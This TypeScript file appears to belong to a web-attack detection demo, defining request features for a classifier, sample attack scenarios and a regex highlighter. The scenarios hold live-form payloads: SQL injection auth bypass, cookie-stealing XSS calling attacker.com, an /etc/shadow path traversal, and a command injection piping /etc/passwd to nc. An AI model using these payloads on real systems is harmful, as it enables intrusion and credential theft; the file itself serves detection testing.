export const MODEL_FEATURES = [
  ['url_length', 'Length of the normalized request URL or target.', 'characters'],
  ['body_length', 'Length of the request body supplied to inference.', 'characters'],
  ['num_special_chars', 'Count of selected punctuation characters across the request.', 'count'],
  ['num_sql_keywords', 'Count of configured SQL keyword matches in request text.', 'count'],
  ['num_xss_keywords', 'Count of configured XSS token matches in request text.', 'count'],
  ['num_path_traversal_patterns', 'Count of recognized parent-directory traversal patterns.', 'count'],
  ['num_command_injection_patterns', 'Count of configured shell-command syntax patterns.', 'count'],
  ['has_encoded_chars', 'Whether percent-encoded byte sequences are present.', '0 or 1'],
  ['num_parameters', 'Number of parsed query and body key-value parameters.', 'count'],
  ['max_param_value_length', 'Length of the longest parsed parameter value.', 'characters'],
  ['avg_param_value_length', 'Mean length of parsed parameter values.', 'characters'],
  ['payload_entropy', 'Shannon entropy of the combined request text.', 'bits per character'],
  ['num_digits_ratio', 'Fraction of combined request characters that are digits.', 'ratio'],
  ['uppercase_ratio', 'Fraction of combined request characters that are uppercase.', 'ratio'],
  ['num_dots', 'Number of periods in the URL path.', 'count'],
  ['num_slashes', 'Number of slashes in the URL path.', 'count'],
  ['request_method', 'Encoded HTTP method: GET=0, POST=1, PUT=2, DELETE=3, PATCH=4, OPTIONS=5, HEAD=6.', 'category ID'],
  ['content_length_header', 'Content-Length header value; falls back to body length when absent.', 'bytes'],
  ['double_encoding_depth', 'Detected repeated percent-encoding depth.', 'count'],
  ['unicode_escape_count', 'Number of Unicode or hex escape sequences.', 'count'],
  ['null_byte_count', 'Number of recognized null-byte encodings.', 'count'],
  ['comment_sequence_count', 'Number of SQL or code comment markers.', 'count'],
  ['hex_encoding_count', 'Number of 0x-prefixed hexadecimal values.', 'count'],
  ['nested_tag_depth', 'Approximate maximum nesting depth of HTML tags.', 'depth'],
  ['event_handler_count', 'Number of recognized HTML event-handler names.', 'count'],
  ['protocol_handler_count', 'Number of recognized nonstandard or script URL schemes.', 'count'],
  ['suspicious_header_count', 'Count of configured suspicious header conditions.', 'count'],
  ['param_name_entropy', 'Shannon entropy of parsed parameter names.', 'bits per character'],
  ['repeated_char_ratio', 'Longest run of a repeated character divided by request length.', 'ratio'],
  ['non_printable_char_count', 'Number of non-printable request characters (excluding common whitespace).', 'count'],
  ['max_param_name_length', 'Length of the longest parsed parameter name.', 'characters'],
  ['query_depth', 'Number of query parameters inferred from ampersands.', 'count'],
  ['body_entropy', 'Shannon entropy of the request body.', 'bits per character'],
  ['url_entropy', 'Shannon entropy of the request URL.', 'bits per character'],
  ['has_base64_pattern', 'Whether a configured Base64-like sequence was found.', '0 or 1'],
  ['semicolon_count', 'Number of semicolons in combined request text.', 'count'],
  ['pipe_count', 'Number of pipe characters in combined request text.', 'count'],
  ['backtick_count', 'Number of backticks in combined request text.', 'count'],
  ['curly_brace_depth', 'Count of configured template-expression markers.', 'count'],
  ['ratio_non_alnum', 'Fraction of combined request characters that are not alphanumeric.', 'ratio'],
  ['consecutive_special_max', 'Longest run of non-alphanumeric characters.', 'characters'],
  ['ssrf_indicator_count', 'Number of configured SSRF-like indicators in request text.', 'count'],
] as const;

export const FEATURE_METADATA = Object.fromEntries(
  MODEL_FEATURES.map(([name, description, unit]) => [
    name,
    {
      label: name.replaceAll('_', ' '),
      description,
      unit,
    },
  ])
) as Record<string, { label: string; description: string; unit: string }>;

export const ATTACK_SCENARIOS = [
  {
    id: 'sqli-auth-bypass',
    title: 'SQL Injection — Auth Bypass',
    category: 'SQLi' as const,
    severity: 'CRITICAL' as const,
    targetEndpoint: '/api/login',
    method: 'POST' as const,
    description: "Classic tautology attack injects ' OR '1'='1' into the password check.",
    payload: {
      username: "admin' OR '1'='1' --",
      password: 'any_random_password',
    },
    explanation:
      'The payload contains a SQL tautology and comment marker. Inspect the gateway verdict for the actual classification and response.',
    cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
  },
  {
    id: 'xss-product-review',
    title: 'Stored XSS — Cookie Stealer',
    category: 'XSS' as const,
    severity: 'HIGH' as const,
    targetEndpoint: '/api/products/1/reviews',
    method: 'POST' as const,
    description: 'Injects malicious script tag into the product reviews section.',
    payload: {
      rating: 5,
      comment: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>Great laptop!",
    },
    explanation:
      'The payload contains script markup and a cookie-access pattern. Inspect the gateway verdict for the actual classification and response.',
    cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
  },
  {
    id: 'path-traversal-passwd',
    title: 'Path Traversal — System Shadow Dump',
    category: 'Path Traversal' as const,
    severity: 'CRITICAL' as const,
    targetEndpoint: '/api/download?file=../../../../etc/shadow',
    method: 'GET' as const,
    description: 'Attempts to break out of webroot and read sensitive Linux shadow passwords.',
    payload: '',
    explanation:
      'The path contains repeated parent-directory sequences. Inspect the gateway verdict for the actual classification and response.',
    cwe: 'CWE-22: Improper Limitation of a Pathname to a Restricted Directory',
  },
  {
    id: 'command-injection-ping',
    title: 'Command Injection — Reverse Shell',
    category: 'Command Injection' as const,
    severity: 'CRITICAL' as const,
    targetEndpoint: '/api/ping',
    method: 'POST' as const,
    description: 'Appends piped OS commands to backend network diagnostic tool.',
    payload: {
      host: '127.0.0.1; cat /etc/passwd | nc attacker.com 4444',
    },
    explanation:
      'The payload contains shell chaining operators and command tokens. Inspect the gateway verdict for the actual classification and response.',
    cwe: 'CWE-78: Improper Neutralization of Special Elements in an OS Command',
  },
  {
    id: 'credential-stuffing-burst',
    title: 'Credential Stuffing — Anomaly Burst',
    category: 'Credential Stuffing' as const,
    severity: 'HIGH' as const,
    targetEndpoint: '/api/login',
    method: 'POST' as const,
    description: 'Automated bot rapidly cycling through leaked email/password combinations.',
    payload: {
      username: 'victim@enterprise.com',
      password: 'password2024!',
    },
    explanation:
      'Repeated authentication attempts exercise the configured rate-limiting policy. Inspect the gateway response for the applied action.',
    cwe: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
  },
  {
    id: 'normal-customer-flow',
    title: 'Benign Traffic — Store Browsing',
    category: 'Normal' as const,
    severity: 'LOW' as const,
    targetEndpoint: '/api/products',
    method: 'GET' as const,
    description: 'Legitimate customer viewing electronics catalog and searching items.',
    payload: '',
    explanation:
      'This benign browsing request provides a comparison scenario. Inspect the gateway verdict for its actual scores and response.',
    cwe: 'Benign Traffic (Clean baseline)',
  },
];

/**
 * Highlights attack patterns inside strings for the Explainable AI inspector.
 */
export function highlightAttackPayload(raw: string): {
  hasSuspiciousTokens: boolean;
  tokens: string[];
  parts: { text: string; suspicious: boolean }[];
} {
  if (!raw) return { hasSuspiciousTokens: false, tokens: [], parts: [] };

  const attackRegex =
    /(\b(UNION|SELECT|FROM|WHERE|INSERT|DELETE|UPDATE|DROP|ALTER|OR|AND|EXEC|BENCHMARK|SLEEP)\b|--|\bOR\b\s+['"]?1['"]?\s*=\s*['"]?1|<script.*?>|<\/script>|javascript:|onerror\s*=|onload\s*=|document\.cookie|\.\.\/|\.\.\\|;\s*cat\b|;\s*whoami\b|\|\s*nc\b)/gi;

  const foundTokens: string[] = [];
  const parts: { text: string; suspicious: boolean }[] = [];
  let previousIndex = 0;
  let match: RegExpExecArray | null;

  while ((match = attackRegex.exec(raw)) !== null) {
    if (match.index > previousIndex) {
      parts.push({ text: raw.slice(previousIndex, match.index), suspicious: false });
    }
    foundTokens.push(match[0]);
    parts.push({ text: match[0], suspicious: true });
    previousIndex = match.index + match[0].length;
  }

  if (previousIndex < raw.length) {
    parts.push({ text: raw.slice(previousIndex), suspicious: false });
  }

  return {
    hasSuspiciousTokens: foundTokens.length > 0,
    tokens: Array.from(new Set(foundTokens)),
    parts,
  };
}
